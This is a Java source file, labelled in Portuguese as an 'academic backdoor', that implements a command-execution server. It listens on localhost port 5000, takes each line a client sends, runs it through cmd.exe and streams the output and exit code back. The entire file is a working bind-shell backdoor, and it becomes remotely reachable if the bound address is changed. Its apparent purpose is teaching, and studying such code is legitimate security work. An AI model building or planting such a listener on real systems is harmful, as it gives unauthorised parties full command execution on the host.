import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class Server {
    private static final String HOST = "127.0.0.1";
    private static final int PORT = 5000;

    public static void main(String[] args) {
        System.out.println("Backdoor Acadêmico - servidor local");
        System.out.println("Escutando somente em " + HOST + ":" + PORT);

        try (ServerSocket serverSocket = new ServerSocket()) {
            serverSocket.bind(new InetSocketAddress(HOST, PORT));

            try (Socket socket = serverSocket.accept();
                 BufferedReader in = new BufferedReader(
                         new InputStreamReader(
                                 socket.getInputStream(),
                                 StandardCharsets.UTF_8));
                 BufferedWriter out = new BufferedWriter(
                         new OutputStreamWriter(
                                 socket.getOutputStream(),
                                 StandardCharsets.UTF_8))) {

                System.out.println("Cliente conectado: "
                        + socket.getRemoteSocketAddress());

                String command;

                while ((command = in.readLine()) != null) {
                    command = command.trim();

                    if (command.equalsIgnoreCase("exit")
                            || command.equalsIgnoreCase("quit")) {

                        out.write("Conexão encerrada pelo servidor.");
                        out.newLine();
                        out.write("<<<FIM_OUTPUT>>>");
                        out.newLine();
                        out.flush();

                        break;
                    }

                    if (command.isEmpty()) {
                        out.write("Comando vazio.");
                        out.newLine();
                        out.write("<<<FIM_OUTPUT>>>");
                        out.newLine();
                        out.flush();
                        continue;
                    }

                    executeCommand(command, out);
                }
            }

        } catch (IOException e) {
            System.err.println("Erro: " + e.getMessage());
        }

        System.out.println("Servidor finalizado.");
    }

    private static void executeCommand(
            String command,
            BufferedWriter out) throws IOException {

        ProcessBuilder pb =
                new ProcessBuilder("cmd.exe", "/c", command);

        pb.redirectErrorStream(true);

        try {
            Process process = pb.start();

            try (BufferedReader processOutput =
                         new BufferedReader(
                                 new InputStreamReader(
                                         process.getInputStream(),
                                         StandardCharsets.UTF_8))) {

                String line;

                while ((line = processOutput.readLine()) != null) {
                    out.write(line);
                    out.newLine();
                }
            }

            int exitCode = process.waitFor();

            out.write("[código de saída: " + exitCode + "]");
            out.newLine();
            out.write("<<<FIM_OUTPUT>>>");
            out.newLine();
            out.flush();

        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();

            out.write("Execução interrompida.");
            out.newLine();
            out.write("<<<FIM_OUTPUT>>>");
            out.newLine();
            out.flush();
        }
    }
}